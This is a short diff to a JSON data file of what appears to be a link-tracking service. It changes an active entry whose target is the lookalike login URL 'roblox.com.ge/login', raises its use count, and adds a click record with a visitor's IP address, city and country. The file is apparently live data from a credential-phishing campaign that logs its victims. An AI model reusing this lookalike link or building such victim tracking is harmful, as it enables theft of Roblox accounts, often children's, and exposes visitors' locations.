@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 928,
+    "useCount": 929,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7544,6 +7544,14 @@
         "city": "Guayaquil",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777201876112,
+        "ip": "87.123.196.75",
+        "country": "Germany",
+        "city": "Bottrop",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
       }
     ]
   },
